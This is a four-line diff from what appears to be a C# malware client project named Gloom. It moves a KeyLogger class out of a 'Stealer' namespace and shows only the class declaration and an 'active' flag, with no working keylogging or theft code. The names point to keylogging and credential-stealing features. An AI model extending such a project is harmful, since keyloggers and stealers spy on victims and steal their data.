@@ -1,4 +1,4 @@
-﻿namespace Gloom.Client.Features.Stealer;
+﻿namespace Gloom.Client.Features;
 internal class KeyLogger : FeatureBase
 {
 	private bool active = true;
